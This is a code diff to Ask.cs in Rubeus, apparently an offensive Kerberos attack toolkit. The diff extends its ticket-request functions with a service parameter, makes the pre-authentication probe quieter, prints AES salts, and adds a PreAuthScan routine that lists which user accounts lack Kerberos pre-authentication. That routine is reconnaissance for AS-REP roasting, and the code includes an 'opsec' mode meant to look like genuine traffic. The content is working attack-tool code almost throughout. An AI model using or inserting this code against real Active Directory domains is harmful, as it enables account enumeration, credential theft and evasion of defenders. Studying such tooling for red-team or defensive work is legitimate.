@@ -32,13 +32,17 @@ namespace Rubeus {
 
     public class Ask
     {
-        public static byte[] TGT(string userName, string domain, string keyString, Interop.KERB_ETYPE etype, string outfile, bool ptt, string domainController = "", LUID luid = new LUID(), bool describe = false, bool opsec = false, string servicekey = "", bool changepw = false, bool pac = true, string proxyUrl = null)
+        public static byte[] TGT(string userName, string domain, string keyString, Interop.KERB_ETYPE etype, string outfile, bool ptt, string domainController = "", LUID luid = new LUID(), bool describe = false, bool opsec = false, string servicekey = "", bool changepw = false, bool pac = true, string proxyUrl = null, string service = null)
         {
             // send request without Pre-Auth to emulate genuine traffic
             bool preauth = false;
             if (opsec)
             {
-                preauth = NoPreAuthTGT(userName, domain, keyString, etype, domainController, outfile, ptt, luid, describe, true, proxyUrl);
+                try
+                {
+                    preauth = NoPreAuthTGT(userName, domain, keyString, etype, domainController, outfile, ptt, luid, describe, true, proxyUrl);
+                }
+                catch (KerberosErrorException) { }
             }
 
             try
@@ -48,7 +52,7 @@ namespace Rubeus {
                 {
                     Console.WriteLine("[*] Using {0} hash: {1}", etype, keyString);               
                     Console.WriteLine("[*] Building AS-REQ (w/ preauth) for: '{0}\\{1}'", domain, userName);
-                    AS_REQ userHashASREQ = AS_REQ.NewASReq(userName, domain, keyString, etype, opsec, changepw, pac);
+                    AS_REQ userHashASREQ = AS_REQ.NewASReq(userName, domain, keyString, etype, opsec, changepw, pac, service);
                     return InnerTGT(userHashASREQ, etype, outfile, ptt, domainController, luid, describe, true, opsec, servicekey, false, proxyUrl);
                 }
             }
@@ -72,7 +76,7 @@ namespace Rubeus {
             return null;
         }
 
-        public static bool NoPreAuthTGT(string userName, string domain, string keyString, Interop.KERB_ETYPE etype, string domainController, string outfile, bool ptt, LUID luid = new LUID(), bool describe = false, bool verbose = false, string proxyUrl = null)
+        public static bool NoPreAuthTGT(string userName, string domain, string keyString, Interop.KERB_ETYPE etype, string domainController, string outfile, bool ptt, LUID luid = new LUID(), bool describe = false, bool verbose = false, string proxyUrl = null, string service = "")
         {
             byte[] response = null;
             AS_REQ NoPreAuthASREQ = AS_REQ.NewASReq(userName, domain, etype, true);
@@ -80,7 +84,7 @@ namespace Rubeus {
 
             if (String.IsNullOrEmpty(proxyUrl))
             {
-                string dcIP = Networking.GetDCIP(domainController, true, domain);
+                string dcIP = Networking.GetDCIP(domainController, verbose, domain);
                 if (String.IsNullOrEmpty(dcIP)) { return false; }
 
                 response = Networking.SendBytes(dcIP, 88, reqBytes);
@@ -105,9 +109,13 @@ namespace Rubeus {
 
             if (responseTag == (int)Interop.KERB_MESSAGE_TYPE.AS_REP)
             {
-                Console.WriteLine("[-] AS-REQ w/o preauth successful! {0} has pre-authentication disabled!", userName);
+                if (verbose)
+                    Console.WriteLine("[-] AS-REQ w/o preauth successful! {0} has pre-authentication disabled!", userName);
 
-                byte[] kirbiBytes = HandleASREP(responseAsn, etype, keyString, outfile, ptt, luid, describe, verbose);
+                if (!String.IsNullOrWhiteSpace(keyString))
+                {
+                    byte[] kirbiBytes = HandleASREP(responseAsn, etype, keyString, outfile, ptt, luid, describe, verbose);
+                }
 
                 return true;
             }
@@ -117,18 +125,28 @@ namespace Rubeus {
                 KRB_ERROR error = new KRB_ERROR(responseAsn.Sub[0]);
                 if (error.error_code == (int)Interop.KERBEROS_ERROR.KDC_ERR_PREAUTH_REQUIRED)
                 {
-
-                    Console.WriteLine("[!] Pre-Authentication required!");
-                    foreach (PA_DATA pa_data in (List<PA_DATA>)error.e_data)
+                    if (verbose)
                     {
-                        if (pa_data.type is Interop.PADATA_TYPE.ETYPE_INFO2)
+                        Console.WriteLine("[!] Pre-Authentication required!");
+                        foreach (PA_DATA pa_data in (List<PA_DATA>)error.e_data)
                         {
-                            if (((ETYPE_INFO2_ENTRY)pa_data.value).etype == (int)Interop.KERB_ETYPE.aes256_cts_hmac_sha1)
+                            if (pa_data.type is Interop.PADATA_TYPE.ETYPE_INFO2)
                             {
-                                Console.WriteLine("[!]\tAES256 Salt: {0}", ((ETYPE_INFO2_ENTRY)pa_data.value).salt);
+                                if (((ETYPE_INFO2_ENTRY)pa_data.value).etype == (int)Interop.KERB_ETYPE.aes256_cts_hmac_sha1)
+                                {
+                                    Console.WriteLine("[!]\tAES256 Salt: {0}", ((ETYPE_INFO2_ENTRY)pa_data.value).salt);
+                                }
+                                else if (((ETYPE_INFO2_ENTRY)pa_data.value).etype == (int)Interop.KERB_ETYPE.aes128_cts_hmac_sha1)
+                                {
+                                    Console.WriteLine("[!]\tAES128 Salt: {0}", ((ETYPE_INFO2_ENTRY)pa_data.value).salt);
+                                }
                             }
                         }
                     }
+                }
+                else
+                {
+                    throw new KerberosErrorException("", error);
                 }
             }
             return false;
@@ -168,7 +186,7 @@ namespace Rubeus {
             }
         }
 
-        public static byte[] TGT(string userName, string domain, string certFile, string certPass, Interop.KERB_ETYPE etype, string outfile, bool ptt, string domainController = "", LUID luid = new LUID(), bool describe = false, bool verifyCerts = false, string servicekey = "", bool getCredentials = false, string proxyUrl = null) {
+        public static byte[] TGT(string userName, string domain, string certFile, string certPass, Interop.KERB_ETYPE etype, string outfile, bool ptt, string domainController = "", LUID luid = new LUID(), bool describe = false, bool verifyCerts = false, string servicekey = "", bool getCredentials = false, string proxyUrl = null, string service = null) {
             try {
                 X509Certificate2 cert = FindCertificate(certFile, certPass);
 
@@ -188,7 +206,7 @@ namespace Rubeus {
                 Console.WriteLine("[*] Using PKINIT with etype {0} and subject: {1} ", etype, cert.Subject);
                 Console.WriteLine("[*] Building AS-REQ (w/ PKINIT preauth) for: '{0}\\{1}'", domain, userName);
 
-                AS_REQ pkinitASREQ = AS_REQ.NewASReq(userName, domain, cert, agreement, etype, verifyCerts);
+                AS_REQ pkinitASREQ = AS_REQ.NewASReq(userName, domain, cert, agreement, etype, verifyCerts, service);
                 return InnerTGT(pkinitASREQ, etype, outfile, ptt, domainController, luid, describe, true, false, servicekey, getCredentials, proxyUrl);
 
             } catch (KerberosErrorException ex) {
@@ -848,6 +866,28 @@ namespace Rubeus {
             }
 
             return kirbiBytes;
+        }
+
+        public static void PreAuthScan(List<string> users, string domain, string dc, string proxyUrl = "")
+        {
+            Interop.KERB_ETYPE etype = Interop.KERB_ETYPE.subkey_keymaterial;
+
+            foreach (string user in users)
+            {
+                try
+                {
+                    bool result = Ask.NoPreAuthTGT(user, domain, null, etype, dc, null, false, new LUID(), false, false, proxyUrl);
+                    if (result)
+                        Console.WriteLine("[*] {0}: Pre-Auth Not Required", user);
+                    else
+                        Console.WriteLine("[*] {0}: Pre-Auth Required", user);
+                }
+                catch (KerberosErrorException ex)
+                {
+                    KRB_ERROR error = ex.krbError;
+                    Console.WriteLine("[X] {0} returned error ({1}) : {2}", user, error.error_code, (Interop.KERBEROS_ERROR)error.error_code);
+                }
+            }
         }
     }
 }
